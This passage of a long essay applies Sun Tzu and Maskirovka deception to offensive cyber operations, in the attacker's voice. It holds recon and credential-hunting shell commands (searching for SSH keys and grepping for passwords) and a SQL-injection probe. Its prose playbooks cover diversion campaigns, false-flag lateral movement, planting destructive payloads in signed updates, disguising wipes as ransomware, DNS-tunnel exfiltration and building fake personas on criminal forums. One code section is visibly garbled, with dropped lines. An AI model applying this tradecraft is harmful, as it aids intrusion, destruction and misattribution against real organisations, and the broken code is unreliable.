This is why reconnaissance is not a preliminary step. It is the decisive step . The attacker who begins an operation with thorough reconnaissance is fresh. The attacker who scans as they go is exhausted before they begin.

Active and Passive Reconnaissance

The clever combatant imposes his will on the enemy,
but does not allow the enemy's will to be imposed on him.

- Sun Tzu

The cyber parallel is the distinction between active and passive reconnaissance. At the strategic level, the distinction between being detected and controlling what is detected .

Active reconnaissance imposes your will on the target. You send packets, you probe defenses, you reveal your interest. But even active reconnaissance can be deceptive. The probes you send can be designed to look like something they are not.

Passive reconnaissance imposes nothing. You gather intelligence from public sources, and the target never knows you were there. But even passive reconnaissance can be turned against you. The target can plant false information in the same public sources, knowing that sophisticated attackers will find it. 

# Active reconnaissance: you are imposing your will
nmap -sV -sC -p- target.example.com

# Passive reconnaissance: the target imposes nothing on you
# DNS enumeration without touching the target
dig +short ANY target.example.com @8.8.8.8

# Certificate transparency — the target published this themselves
curl -s "https://crt.sh/?q=%25.target.example.com&output=json" | jq '.[].name_value'

# Shodan — someone else scanned them, you read the results
curl -s "https://internetdb.shodan.io/$(dig +short target.example.com)"

# Wayback Machine — historical versions of their own website
# (But beware: the target may have planted deceptive content in old versions,
# knowing that sophisticated attackers use the Wayback Machine for recon.)
curl -s "https://web.archive.org/cdx/search/cdx?url=target.example.com/*&output=text&fl=original"

# The deception arms race in reconnaissance:
# - Attackers use passive recon to avoid detection
# - Defenders plant false data in passive recon sources to deceive attackers
# - Attackers cross-reference multiple sources to detect planted data
# - Defenders plant consistent false data across multiple sources
# - Attackers use active recon to verify passive findings
# - Defenders detect the active recon and now know an attack is coming
# This is the eternal dance of Weak Points and Strong.

Numerical Weakness applied to Quick Enumeration

Numerical weakness comes from having to prepare against possible attacks;
numerical strength, from compelling our adversary to make these preparations against us.

- Sun Tzu

This is the principle of asymmetry in cyber defense and its corollary in deception. The defender must secure every service, every port, every endpoint, every user account, every third-party integration, every supply chain dependency. The attacker needs to find only one weakness through quick enumeration.

But the attacker can exploit this asymmetry further through deception. By creating the appearance of attacks against multiple vectors, the attacker forces the defender to spread their already-thin resources even thinner. Every false alarm consumes analyst time. Every diversionary probe triggers an investigation.

Every shitstorm post that suggests a new attack vector forces the defender to check that vector. Meanwhile, the one real weakness, the one the attacker actually intends to exploit, remains unexamined because the defender is investigating all the other false leads.

Spread Limited Resources

The underlying principle allows to force the defender to spread their limited resources on machines that are not the operational target objective.

In Phase 1 it is all about triggering alerts across multiple unrelated systems.

  • Send phishing emails to 50 employees (triggers email security team)
  • Port scan the external perimeter from 20 different countries (triggers network team)
  • Push a malicious package to the company's public npm registry (triggers devsecops)
  • Attempt login to 100 VPN accounts with common passwords (triggers IAM team)
  • All of these are diversions. The real attack is none of them.

In Phase 2 all teams are investigating their respective alerts, and the attacker exploits that one vulnerability none of them are looking at, for example a simple misconfigured S3 bucket with write access that was never included in any security scan.

In Phase 3 the malware is implanted as a file in the S3 bucket. The CI/CD pipeline or Microsoft Office workflow picks it up. It's now inside the network. Trusted. Deployed to production. Every security tool in the pipeline says it's clean, because the security team was too busy investigating your diversions to update the pipeline's scanning rules.

Attacking Undefended Places

You can be sure of succeeding in your attacks
if you only attack places which are undefended.

You can ensure the safety of your defense
if you only hold positions that cannot be attacked.

- Sun Tzu

This is the essence of vulnerability discovery. Find the unguarded point. The unguarded point is rarely the main application. It is the administrative panel left on a forgotten subdomain. The Jenkins or Postgres instance with default credentials. The S3 bucket with public read access. The debug endpoint that was never removed from production. The intern's GitHub repository with hardcoded API keys in the source code.

But the deception dimension is that the defender believes these points are guarded. The Jenkins instance is behind the firewall. The S3 bucket has a policy that "looks right." The debug endpoint "shouldn't be accessible from the internet." The intern "deleted the repo months ago."

The unguarded point is unguarded precisely because the defender's mental model of their own attack surface is incorrect. The attacker's task is not merely to find the hole, it is to understand the defender's false beliefs well enough to predict which holes will exist :

Chapter 7 - Maneuvering

In war, the general receives his commands from the sovereign.
Having collected an army and concentrated his forces, he must blend
and harmonize the different elements thereof before pitching his camp.

- Sun Tzu

In a cyber operation, the "different elements" are the components of the kill chain. The initial access, dropper execution, implant persistence, privilege escalation, defense evasion, credential access, network discovery, lateral movement, data collection, data exfiltration, and command and control.

These must be harmonized before the operation begins, and the deception plan must be harmonized with the operational plan. A common failure for this is that the operational plan requires stealth, but the deception plan requires noise. The operator tries to do both and achieves neither. The solution is to separate the operational and deceptive elements. Assign them to different infrastructure, different operators, even different botnet segments, so that each can execute its role without compromising or revealing the other one.

Tactical Maneuvering

After that comes tactical maneuvering,
than which there is nothing more difficult.

The difficulty of tactical maneuvering consists in turning
the devious into the direct, and misfortune into gain.

- Sun Tzu

Lateral movement is the tactical maneuver of cyber operations, and it is also the phase where deception is most critical. You have established a foothold on a low-value workstation. Now you must reach the domain controller, the database server, the build pipeline. Every hop you take is a chance to be detected. Every credential you use is a chance to trigger an alert. Every process you spawn is a chance for EDR to flag anomalous behavior.

The deceptive lateral movement operator does not just move, they move in a way that, if detected, points the investigation in the wrong direction : 

# Deceptive lateral movement: leaving false trails

# 1. Normal lateral movement leaves a trail: Workstation A -> Server B -> DC
#    The IR team follows the trail and finds your persistence on the DC.

# 2. Deceptive lateral movement leaves a maze:
#
#    Workstation A -> Server B -> Workstation C -> Server D -> Workstation E -> DC
#    But Server B, Workstation C, and Server D are all honeypots you identified earlier.
#    The IR team follows the trail into a dead end.
#
#    Meanwhile, the real path was: Workstation A -> (pass-the-hash) -> DC
#    The real path took 30 seconds. The false trail will take them 3 days to unravel.

# Enumerate what hosts are visible from your current position
ip addr show | grep -E 'inet ' | awk '{print $2}'

# Discover accessible hosts
for i in $(seq 1 254); do
  (ping -c 1 -W 1 10.0.0.$i > /dev/null 2>&1 && echo "10.0.0.$i alive") &
done
wait

# Enumerate services your current user can access
ss -tlnp 2>/dev/null

# Find credentials and keys — including those you will use for false trails
find /home -name "id_rsa" -o -name "*.pem" -o -name "credentials" 2>/dev/null
grep -r "password" /opt/ 2>/dev/null | head -20

# The deceptive lateral movement operator also checks for:
# - Which accounts are monitored? (Use a low-privilege account first; if you
#   survive 24 hours without alert, the account is probably not monitored.)
# - Which hosts are honeypots? (Too many open ports, too easy to access,
#   services that don't match the host's ostensible role.)
# - Which hours are safe? (Lateral movement during business hours blends in
#   with legitimate admin activity. Movement at 3 AM stands out.)

Direct Lateral Movement

Thus, to take a long and circuitous route, after enticing
the enemy out of the way, and though starting after him,
to contrive to reach the goal before him, shows knowledge
of the artifice of deviation.

- Sun Tzu

Sometimes the direct path, like exploiting the database server directly, is blocked by network segmentation, WAF rules, or hardened configurations because the defender's framework prioritized these machines higher than their workstations in terms of SIEM/SOAR or EDR alerts.

The circuitous route, like compromising a developer's workstation, stealing their credentials, and connecting through the approved management interface or an approved network host like GitHub, may take longer but succeeds where the direct attack would fail.

And sometimes the circuitous route is the deceptive route. The one route that makes the attack look like it came from somewhere else entirely. A direct path often is blocked by WAF rule, input validation, network segmentation, and is therefore almost always integrated in SIEM/SOAR dashboards.

  • Internet host
  • connects to WAF
  • connects to Web Server
  • connects to Database

Circuitous Lateral Movement

A circuitous path would try to attack the DevOps or supply chain infrastructure. For example, the database is compromised by a build artifact signed by the target's own CI/CD pipeline. The "attack" came from inside the house and from the target's own infrastructure. Attribution points at the target's own DevOps team.

  • Internet host sends phishing email
  • Implant steals credentials from Developer Laptop
  • connects to VPN
  • jumps Host to CI/CD runner and produces build artifact
  • Database server installs new update

The Nine Variations

Sun Tzu's "nine variations" describe how tactics must change with circumstances. The cyber equivalent is the principle that no single TTP or exploit killchain works against every target, and no single deception strategy works against every defender :

Circumstance Tactical Variation Deception Variation
Monitored environment Slow down. Rate-limit beacons. Use long jitter. Blend into background noise. Mimic the target's own operational network traffic so that your activity falls within their baseline.

The Roads Not Followed

There are roads which must not be followed,
armies which must not be attacked,
towns which must not be besieged,
positions which must not be contested, and
commands of the sovereign which must not be obeyed.

- Sun Tzu

Not every vulnerability should be exploited. Not every accessible host should be compromised. Not every credential should be used. The mark of an experienced operator is knowing what to leave alone.

A service that looks too interesting is likely a honeypot and therefore a trap. If you interact with it, make it look like a low-capability threat actor. Don't reveal your best exploitation techniques. The defender sees the interaction, categorizes it as "script kiddie probing," and downgrades the alert. The real operation continues elsewhere.

A file looking to good to be really there, it's likely a canary. If touched, it triggers a silent alert. The experienced operator identifies canaries by their properties. Files with no legitimate purpose for the user, accounts with no login history, registry keys in unusual locations, and avoids them.

A password that is just left in a "passwords.txt" on the Desktop is likely a monitored credential. When used it immediately flags the authenticating host for investigation. These are often placed in locations where an attacker would find them, in ~/backup/credentials.txt , a sticky note on a Virtual Desktop, a plaintext password in a configuration file. The trap is baited with convenience.

Chapter 9 - The Army on the March

We come now to the question of encamping the army,
and observing signs of the enemy.

Pass quickly over mountains, and
keep in the neighborhood of valleys.

Camp in high places, facing the sun.
Do not climb heights in order to fight.

- Sun Tzu

In network reconnaissance, the "signs of the enemy" are the signals that every system emits. Some signals are emitted intentionally, some accidentally. The skilled operator learns to read them. But the defender also knows the operator is reading them and can emit false signals designed to deceive.

This is the reconnaissance and counter-reconnaissance arms race : 

# Signs of the enemy: OS fingerprinting through initial TCP parameters
nmap -O target.example.com
# Counter: The defender configures their systems to return TCP parameters
#          that mimic a different OS. nmap reports "Linux 3.x" but the
#          server is actually Windows Server 2022 with a custom TCP stack.

# Signs of the enemy: service version disclosure
nmap -sV -p 22,80,443,3306,8080,8443 target.example.com
# Counter: The defender configures service banners to report older,

#          and the failed exploit triggers an alert.

# Signs of the enemy: reading SMTP banners for internal hostnames
echo "QUIT" | nc target.example.com 25
# Counter: The SMTP banner contains a fake internal hostname that doesn't

  | openssl x509 -noout -text | grep -E 'Subject:|Issuer:|Not Before|Not After|DNS:'
# Counter: The certificate contains SAN entries for subdomains that don't
#          exist. The attacker enumerates fake infrastructure. Every DNS

#          knows someone is enumerating their certificate.

Strength of Position

When the enemy is close at hand and remains quiet,
he is relying on the natural strength of his position.

- Sun Tzu

In the cyber domain, a target that exposes almost nothing, like no open ports beyond 443, no service banners, no verbose error messages, no directory listings, is not necessarily secure. It may be relying on obscurity rather than strength. In the Maskirovka dimension it may also be deliberately exposing nothing because the real target is elsewhere, and the quiet system is a decoy designed to absorb reconnaissance effort. 

# Probing a seemingly quiet target to determine whether its silence
# is strength or mere obscurity — or a deliberate deception

# Check if 403 is returned for common paths (obscurity)
curl -s -o /dev/null -w "%{http_code}" https://target.example.com/.env
curl -s -o /dev/null -w "%{http_code}" https://target.example.com/admin

# Check if verbose errors are suppressed (strength) or revealed (weakness)
curl -s "https://target.example.com/?id='"

# Check if security headers are present (strength) or absent (weakness)
curl -sI https://target.example.com | grep -iE 'strict-transport|content-security|x-frame|x-content'

# The deception check: is this even the real target?
# Compare Shodan data, DNS history, and certificate transparency.
# If the IP address changed recently, the old IP might still host the real service.
# If the nameservers changed, the DNS might be controlled by a different entity.
dig +short target.example.com
dig +short target.example.com @1.1.1.1  # Compare with different resolver

Chapter 10 - Terrain

We may distinguish six kinds of terrain: accessible ground, entangling
ground, temporizing ground, narrow passes, precipitous heights, and
positions at a great distance from the enemy.

- Sun Tzu

The Six Kinds of Terrain

The six kinds of terrain, mapped to network environments :

Sun Tzu's Terrain Cyber Domain Terrain Deception Implications
Accessible ground Flat network with no segmentation Easy to move, easy to detect. Deploy decoys to create false complexity.
Entangling ground Strong egress filtering and app proxying Use the defender's own egress channels. Exfiltrate through their own telemetry and services.
Temporizing ground Honeynet or canary environment Identify honeypot characteristics and avoid them. Interact deliberately to feed false intelligence.
Narrow passes Jump host or bastion gateways Control the narrow pass and control who appears to pass through it. Log own activity as someone else's.
Precipitous heights Domain controller or identity provider From this position, forge any identity. Create accounts. Modify logs. Grant and revoke access.
Positions at a great distance Segregated environments with no direct network path Each environment requires its own access campaign. Compromise one environment and use it to phish credentials from another.

The Six Ways of Defeat

There are six ways of courting defeat: flight, insubordination,
collapse, ruin, disorganization, and rout.

- Sun Tzu

Sun Tzu's six calamities, translated to operational failures with the specific failure modes that arise from inadequate deception planning :

Calamity Cyber Domain Calamity Deception Failure Mode
Flight Abort operation prematurely, leave artifacts behind Abandoned artifacts provide attribution evidence. If deception plan was incomplete, artifacts point at real operator.
Insubordination Deviate from the operational plan, use of unapproved tools Unapproved tool leaves signatures inconsistent with the deception plan. Analyst identifies a false flag.
Collapse C2 infrastructure failure, seized server, killed certificate C2 infrastructure was shared with deception infrastructure, both collapse simultaneously. Real operation is exposed.
Ruin Burned exploit inventory before objective achievement Attacker resorts to noisy, low-sophistication exploits. Deception plan collapses because attacker can not impersonate APT's sophistication level.
Disorganization Loss of operational coherence, conflicting TTPs and C2 channels Deception plan and operational plan interfere with each other. False flag domain is sinkholed by the deception target.
Rout Cascading detection, attribution and geopolitical consequences Detection leads to investigation, investigation reveals deception plan, deception plan reveals the real operator, real operator is attributed.

Chapter 11 - The Nine Situations

The art of war recognizes nine varieties of ground: dispersive ground,
facile ground, contentious ground, open ground, ground of intersecting highways,
serious ground, difficult ground, hemmed-in ground, and desperate ground.

On dispersive ground, do not fight.
On facile ground, do not halt.
On contentious ground, do not attack.
On open ground, do not try to block the enemy's way.
On the ground of intersecting highways, join hands with your allies.
On serious ground, gather in plunder.
On difficult ground, keep steadily on the march.
On hemmed-in ground, resort to stratagem.
On desperate ground, fight.

- Sun Tzu

The nine situations, projected onto cyber operational contexts with the specific deception strategy for each :

Situation Description Operational Strategy Deception Strategy
Dispersive ground Operating from own infrastructure, attribution dominant Maximum OPSEC. Every connection routed, proxied, and anonymized. Infrastructure should look like someone else's. Register domains to impersonate different organization.
Facile ground Initial access achieved, no persistence yet Move quick to establish persistence before entry vector is patched. Persistence mechanism should look like it was already there. Scheduled task or service that "must have been created by IT."
Contentious ground Both attacker and defender active Speed and decisiveness. Achieve objective and withdraw. While withdrawing, leave artifacts for the IR team that point to a different objective. They stop looking once they "know" what you wanted.
Open ground Broad attack surface, multiple entry points Diversify. Multiple independent persistence mechanisms. Persistence mechanism should look like a different APT installed it. The IR team wastes time thinking they're dealing with separate intrusions.
Ground of intersecting highways Network bridging multiple organizations Segregation is critical. Actions on one customer visible to others. If detected, make it look like a different customer was targeted on shared infrastructure. Real target attributes attack to service provider.
Serious ground Penetration into hardened network. Extraction difficult. Move deliberately. Plan exfiltration before collection. Exfiltration should look like legitimate backup traffic. The target's own backup system sees "their" data moving to "their" offsite storage.
Difficult ground Air-gapped or heavily segmented networks Patience. Siege, not raid. Expand incrementally. Each compromise should look like it was from inside the already-compromised segment. The IR team traces attack back to the already cleaned segment.
Hemmed-in ground Trapped. Egress blocked, C2 burned, access remains Find single unmonitored protocol. DNS tunneling. ICMP exfiltration. Exfiltration needs to look like normal network traffic. If you exfiltrate via DNS, use queries for domains the target normally resolves.
Desperate ground Discovery imminent. Hours or minutes remain. Achieve objective. Burn everything on exit. The burn should look like a different attack. Make cleanup look like a ransomware deployment.

Chapter 12 - Attack by Fire

There are five ways of attacking with fire.
The first is to burn soldiers in their camp;
the second is to burn stores;
the third is to burn baggage trains;
the fourth is to burn arsenals and magazines;
the fifth is to hurl dropping fire amongst the enemy.

- Sun Tzu

The five ways of attacking with fire, in the cyber domain, and their deceptive applications :

Sun Tzu's Method Cyber Domain Method Deceptive Use
Burn soldiers in their camp DDoS, overwhelm capacity, exhaust compute, saturate bandwidth DDoS as a diversion for the real operation. DDoS that looks like a different APT's signature pattern.
Burn stores Destroy data, wipe databases, corrupt filesystems, encrypt assets Wipe database but leave evidence that it was already corrupted before you arrived.
Burn baggage trains Disrupt logistics, compromise supply chain, poison CI/CD, corrupt updates Plant destructive payload in an update signed by the target's own key. Target distributes the payload.
Burn arsenals and magazines Destroy capability, brick firmware, overwrite bootloaders, SCADA damage Make firmware brick look like failed legitimate update. The vendor gets blamed.
Hurl dropping fire amongst the enemy Seed chaos, leak communications, release data, trigger false alerts Release exfiltrated data that implicates an innocent third party. Target retaliates against wrong adversary.

Destructive Arsenal

In order to carry out an attack,
we must have means available.

The material for raising fire should
always be kept in readiness.

- Sun Tzu

The destructive capability must be available before it is needed, but it must be separate from the intelligence-gathering capability. The operator who uses the same infrastructure for espionage and destruction has violated the fundamental principle of compartmentalization. When the destructive operation is discovered because the fire is always visible, then the intelligence operation is discovered with it :

A Segregated C2 Architecture has two different infrastrucutre groups. One for Espionage that is covert, long-term, and never burnt. And a second one for Destruction that is visible, short-term, and expected to be burned. No shared IPs between infrastructures, domains, certificates, or payment methods between both groups.

Chapter 13 - The Use of Spies

What enables the wise sovereign and the good general
to strike and conquer, and achieve things beyond the
reach of ordinary men, is foreknowledge.

Now this foreknowledge cannot be elicited from spirits;
it cannot be obtained inductively from experience,
nor by any deductive calculation.

Knowledge of the enemy's dispositions can only
be obtained from other men.

Hence the use of spies, of whom there are five classes:
local spies, inward spies, converted spies, doomed spies,
and surviving spies.

- Sun Tzu

In the cyber domain, "other men" has the same meaning as intelligence and reconnaissance data. You cannot hack what you do not understand, and you cannot understand what you have not gathered intelligence about. Foreknowledge, the information about the target obtained before the first packet is sent, is what separates a successful operation from a failed one.

But Sun Tzu's critical insight is that foreknowledge cannot be derived from pure analysis. It requires sources . Human sources, technical sources, open sources, and above all, sources the enemy does not know are sources.

The Five Classes of Spies

The five classes of spies, adapted to cyber intelligence with the Maskirovka dimension :

Sun Tzu's Spy Cyber Domain Spy Deceptive Application
Local spies OSINT OSINT can be planted. Fake job posting reveals fake tech stack. Fake GitHub repo contains fake credentials.
Inward spies Insider access Insider may be a double agent, feeding you information the target wants you to have.
Converted spies Turned assets A turned implant is a direct line to the enemy's decision-making process, but only if you know it's turned.
Doomed spies Disposable infrastructure The doomed spy's tests the defender's detection capabilities, and consumes their analytical resources, and receives attribution.
Surviving spies Persistent implants The surviving spy must be indistinguishable must be undetectable. No custom protocols, no beacons, no regular intervals.

Forum and Imageboard Infiltration

One of the most important intelligence operations in the cyber domain is the infiltration of underground forums and imageboards. Every major intelligence agency maintains personas on 4chan.org, XSS.is, Exploit.in, RAMP, BreachForums, and their successors. These personas gather intelligence, identify emerging threats, and feed a lot of disinformation.

The forum persona is a long-term intelligence asset. It must be cultivated over a long period of time :

In Months 1 to 3 the account is created and established. No operational activity, just lurking. Post in beginner threads. Ask naive questions. Build a reputation as a newcomer. Make mistakes that experienced operators would recognize. This makes the persona seem authentic.

In Months 4 to 6 try to establish technical credibility. Contribute to discussions. Share a minor, previously undisclosed technique. Something real but of low-value for practical operations. The persona is now "one of us" as they like to say.

In Months 7 to 9 star with private messaging with key forum members. Establish trust relationships. Offer to collaborate on projects. The persona now has access to private channels where real operations are discussed.

In Months 10 and later the persona is now a trusted member of the communtiy and can gather intel on planned operations, potentially identify other personas. Keep in mind that those forums are full of spies from multiple agencies, all pretending to be criminals. Plant disinformation actively that shapes other actors' targeting opbectives. During a shitstorm, the established persona can either amplify the chaos or provide "authorative" explanations that steer the community's understanding in the desired direction.

The Intuitive Sagacity of Spies

Spies cannot be usefully employed without a certain intuitive
sagacity. They cannot be properly managed without benevolence
and straightforwardness.

Without subtle ingenuity of mind, one cannot make certain
of the truth of their reports.

- Sun Tzu

Intelligence without analysis is noise. Every piece of data gathered through reconnaissance must be validated, correlated, and interpreted. A single OSINT source may be inaccurate, outdated, or deliberately planted. Only through cross-referencing multiple independent sources can a good operator verify and validate the truth : 

# Cross-referencing intelligence sources: a single indicator is weak.
# Multiple independent corroborating sources approach the truth.

# Source 1: Certificate Transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u > ct_domains.txt

# Source 2: DNS enumeration
subfinder -d target.com -silent > dns_domains.txt

# Source 3: Web archive
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey" \
  | grep -oP 'https?://[^/]+' | sort -u > archive_domains.txt

# Source 4: Shodan (independent third party, difficult for target to manipulate)
curl -s "https://internetdb.shodan.io/$(dig +short target.com | head -1)" | jq -r '.hostnames[]?' > shodan_domains.txt

# Source 5: SecurityTrails (historical DNS — patterns over time reveal truth)
curl -s "https://securitytrails.com/domain/target.com/subdomains" | jq -r '.subdomains[]?' > strails_domains.txt

# Correlate: domains appearing in 4+ sources are highly reliable.
# Domains appearing in only 1 source may be planted or ephemeral.
cat ct_domains.txt dns_domains.txt archive_domains.txt shodan_domains.txt strails_domains.txt \
  | sort | uniq -c | sort -rn | head -30
					
The end and aim of spying in all its five
varieties is knowledge of the enemy;
and this knowledge can only be derived,
in the first instance, from the converted spy.

Hence it is essential that the converted spy
be treated with the utmost liberality.

- Sun Tzu

The "converted spy", aka the turned asset or the double agent, is the most valuable intelligence source in both Sun Tzu's framework and in cyber operations. A compromised system that you control without the target's knowledge is far more valuable than any external reconnaissance. It sees what the target sees. It hears what the target hears. It provides ground truth against which all other intelligence can be calibrated.

But the converted spy is also the most dangerous. If the target has discovered the compromise and is feeding false data through the same channel, every "intelligence" report from that source is a lie designed to shape your decisions. Every report must be questioned. Every source must be verified. Every assumption must be challenged.

This is the final lesson of Maskirovka.The deception you are most vulnerable to is the one you believe you are too clever to fall for.

The Cyber Strategist's Codex

Sun Tzu closes The Art of War without a formal conclusion. The thirteen chapters stand as a complete system. Each of them necessary, none sufficient alone. The same is true of their cyber domain adaptation.

A cyber operator who masters exploitation but neglects reconnaissance is blind. One who masters reconnaissance but neglects OPSEC is exposed. One who masters OPSEC but neglects deception is predictable. One who masters deception but neglects the economics of the operation will run out of resources before achieving the objective. Strategy is not the sum of tactics; it is a framework that gives tactics meaning.

The principles in this treatise are not a checklist. They are a way of thinking. The operator who can understand why an action is taken, not merely how to take it, will adapt to circumstances that no playbook can anticipate. The operator who sees the cyber domain as a terrain of strategic conflict and not as a collection of CVEs and exploits will achieve objectives that appear impossible to those who see only tools and techniques.

The operator who understands Maskirovka as a comprehensive doctrine of strategic deception, will operate in a dimension their adversaries do not even know exists. While the defender searches for artifacts and the analyst builds attribution profiles, the Maskirovka-aware operator has already shaped what they will find. The defender's confidence in their own conclusions is the operator's greatest weapon.

Study these principles. Question them. Adapt them. And above all, remember Sun Tzu's first and final lesson : The supreme art of war is to subdue the enemy without fighting. In the cyber domain, the supreme operation is the one that achieves its objective while leaving the target unaware that anything ever happened. Or, if awareness is inevitable, leaving them certain that someone else was responsible.
